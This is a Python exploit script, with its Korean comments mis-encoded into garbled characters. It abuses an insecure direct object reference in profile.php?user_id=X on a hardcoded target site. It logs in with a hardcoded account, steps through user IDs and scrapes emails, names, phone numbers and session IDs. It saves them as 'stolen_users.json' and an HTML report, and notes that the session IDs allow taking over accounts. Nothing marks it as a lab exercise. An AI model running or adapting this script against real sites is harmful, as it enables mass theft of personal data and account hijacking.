#!/usr/bin/env python3
"""
IDOR Exploit - ëª¨ë“  ì‚¬ìš©ì ì •ë³´ ì¶”ì¶œ
profile.php?user_id=X ì·¨ì•½ì  ì•…ìš©
"""

import requests
import json
import re
from bs4 import BeautifulSoup

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

def extract_user_data(html):
    """HTMLì—ì„œ ì‚¬ìš©ì ì •ë³´ ì¶”ì¶œ"""
    soup = BeautifulSoup(html, 'html.parser')

    data = {}

    # ì´ë©”ì¼ ì¶”ì¶œ
    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', html)
    if emails:
        data['email'] = emails[0]

    # ì´ë¦„ ì¶”ì¶œ
    name_patterns = [
        r'<h[1-3].*?>(.*?)</h[1-3]>',
        r'ì´ë¦„[:\s]*(.*?)<',
        r'Name[:\s]*(.*?)<',
    ]
    for pattern in name_patterns:
        names = re.findall(pattern, html, re.IGNORECASE)
        if names:
            data['name'] = names[0].strip()
            break

    # ì‚¬ìš©ìëª… ì¶”ì¶œ
    username_patterns = [
        r'ì‚¬ìš©ìëª…[:\s]*(.*?)<',
        r'Username[:\s]*(.*?)<',
        r'@(\w+)',
    ]
    for pattern in username_patterns:
        usernames = re.findall(pattern, html, re.IGNORECASE)
        if usernames:
            data['username'] = usernames[0].strip()
            break

    # ì „í™”ë²ˆí˜¸ ì¶”ì¶œ
    phones = re.findall(r'\d{2,3}-\d{3,4}-\d{4}', html)
    if phones:
        data['phone'] = phones[0]

    # ì„¸ì…˜ ì •ë³´ ì¶”ì¶œ
    if 'PHPSESSID' in html or 'session' in html.lower():
        session_matches = re.findall(r'PHPSESSID["\s:=]+([a-zA-Z0-9]+)', html)
        if session_matches:
            data['session_id'] = session_matches[0]

    return data

def exploit_idor(base_url, max_users=100):
    """IDOR ì·¨ì•½ì ìœ¼ë¡œ ëª¨ë“  ì‚¬ìš©ì ì •ë³´ ì¶”ì¶œ"""

    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}ğŸ¯ IDOR Exploit - ì‚¬ìš©ì ì •ë³´ ëŒ€ëŸ‰ ì¶”ì¶œ{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}\n")

    print(f"{Colors.BLUE}Target: {base_url}{Colors.END}")
    print(f"{Colors.BLUE}Endpoint: /profile.php?user_id=X{Colors.END}\n")

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    })

    # aliceë¡œ ë¡œê·¸ì¸ (ì„ íƒì‚¬í•­)
    print(f"{Colors.YELLOW}[*] aliceë¡œ ë¡œê·¸ì¸ ì¤‘...{Colors.END}")
    login_data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=login_data, allow_redirects=True)
    print(f"{Colors.GREEN}âœ“ ë¡œê·¸ì¸ ì™„ë£Œ{Colors.END}\n")

    users_data = []

    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}ì‚¬ìš©ì ì •ë³´ ìˆ˜ì§‘ ì¤‘...{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    for user_id in range(1, max_users + 1):
        url = f"{base_url}/profile.php?user_id={user_id}"

        try:
            response = session.get(url, timeout=10)

            if response.status_code == 200 and len(response.text) > 500:
                # ë°ì´í„° ì¶”ì¶œ
                user_data = extract_user_data(response.text)
                user_data['user_id'] = user_id
                user_data['profile_url'] = url

                users_data.append(user_data)

                print(f"{Colors.GREEN}âœ“ User {user_id:3d}:{Colors.END}")

                if 'email' in user_data:
                    print(f"    Email: {user_data['email']}")
                if 'username' in user_data:
                    print(f"    Username: {user_data['username']}")
                if 'name' in user_data:
                    print(f"    Name: {user_data['name']}")
                if 'phone' in user_data:
                    print(f"    Phone: {user_data['phone']}")
                if 'session_id' in user_data:
                    print(f"{Colors.CYAN}    ğŸ”‘ Session ID: {user_data['session_id']}{Colors.END}")

                print()

            elif response.status_code == 404:
                # ë” ì´ìƒ ì‚¬ìš©ì ì—†ìŒ
                print(f"{Colors.RED}âœ— User {user_id}: 404 (ë§ˆì§€ë§‰ ì‚¬ìš©ì){Colors.END}\n")
                break
            else:
                print(f"{Colors.RED}âœ— User {user_id}: {response.status_code}{Colors.END}")

        except Exception as e:
            print(f"{Colors.RED}âœ— User {user_id}: ì˜¤ë¥˜ - {e}{Colors.END}")

    # ê²°ê³¼ ì €ì¥
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}ğŸ“Š ìˆ˜ì§‘ ì™„ë£Œ{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    print(f"ì´ {len(users_data)}ëª…ì˜ ì‚¬ìš©ì ì •ë³´ ìˆ˜ì§‘ë¨\n")

    # JSON íŒŒì¼ë¡œ ì €ì¥
    with open('stolen_users.json', 'w', encoding='utf-8') as f:
        json.dump(users_data, f, ensure_ascii=False, indent=2)

    print(f"{Colors.GREEN}âœ“ ì €ì¥ ì™„ë£Œ: stolen_users.json{Colors.END}\n")

    # ìš”ì•½ ì¶œë ¥
    print(f"{Colors.BOLD}ìˆ˜ì§‘ëœ ì •ë³´ ìš”ì•½:{Colors.END}\n")

    for user in users_data:
        print(f"{Colors.CYAN}User {user['user_id']}:{Colors.END}")
        if 'email' in user:
            print(f"  ğŸ“§ {user['email']}")
        if 'username' in user:
            print(f"  ğŸ‘¤ {user['username']}")
        if 'session_id' in user:
            print(f"  ğŸ”‘ Session: {user['session_id']}")
        print()

    # HTML ë¦¬í¬íŠ¸ ìƒì„±
    html_report = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>IDOR Exploit Report - {base_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        h1 {{ color: #d32f2f; }}
        .user {{ background: white; padding: 15px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .user-id {{ font-weight: bold; color: #1976d2; }}
        .email {{ color: #388e3c; }}
        .session {{ background: #fff3cd; padding: 5px; border-radius: 3px; }}
    </style>
</head>
<body>
    <h1>ğŸ¯ IDOR Exploit Report</h1>
    <p><strong>Target:</strong> {base_url}</p>
    <p><strong>Vulnerability:</strong> /profile.php?user_id=X</p>
    <p><strong>Total Users:</strong> {len(users_data)}</p>
    <hr>
"""

    for user in users_data:
        html_report += f"""
    <div class="user">
        <span class="user-id">User {user['user_id']}</span><br>
"""
        if 'email' in user:
            html_report += f'        <span class="email">ğŸ“§ {user["email"]}</span><br>\n'
        if 'username' in user:
            html_report += f'        ğŸ‘¤ Username: {user["username"]}<br>\n'
        if 'name' in user:
            html_report += f'        ğŸ“ Name: {user["name"]}<br>\n'
        if 'phone' in user:
            html_report += f'        ğŸ“ Phone: {user["phone"]}<br>\n'
        if 'session_id' in user:
            html_report += f'        <span class="session">ğŸ”‘ Session: {user["session_id"]}</span><br>\n'

        html_report += f'        <small>URL: <a href="{user["profile_url"]}" target="_blank">{user["profile_url"]}</a></small>\n'
        html_report += '    </div>\n'

    html_report += """
</body>
</html>
"""

    with open('idor_report.html', 'w', encoding='utf-8') as f:
        f.write(html_report)

    print(f"{Colors.GREEN}âœ“ HTML ë¦¬í¬íŠ¸ ìƒì„±: idor_report.html{Colors.END}\n")
    print(f"{Colors.YELLOW}ğŸ’¡ ë¸Œë¼ìš°ì €ì—ì„œ idor_report.htmlì„ ì—´ì–´ì„œ ê²°ê³¼ í™•ì¸í•˜ì„¸ìš”{Colors.END}\n")

    return users_data

if __name__ == '__main__':
    import sys

    TARGET = "http://healthmash.net"
    MAX_USERS = 50  # ìµœëŒ€ 50ëª…ê¹Œì§€ ì‹œë„

    try:
        users = exploit_idor(TARGET, MAX_USERS)

        print(f"\n{Colors.BOLD}{Colors.GREEN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}âœ“ IDOR ê³µê²© ì„±ê³µ!{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}{'='*80}{Colors.END}\n")

        print(f"{Colors.CYAN}íšë“í•œ ì •ë³´:{Colors.END}")
        print(f"  - ì‚¬ìš©ì {len(users)}ëª…")
        print(f"  - JSON: stolen_users.json")
        print(f"  - HTML: idor_report.html\n")

        # ì„¸ì…˜ ID ìˆëŠ” ì‚¬ìš©ì í™•ì¸
        sessions = [u for u in users if 'session_id' in u]
        if sessions:
            print(f"{Colors.YELLOW}âš  ì„¸ì…˜ ID ë°œê²¬: {len(sessions)}ëª…{Colors.END}")
            print(f"  â†’ ì´ ì„¸ì…˜ IDë¡œ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ ê°€ëŠ¥!\n")

    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}âš  ì¤‘ë‹¨ë¨{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}âŒ ì˜¤ë¥˜: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
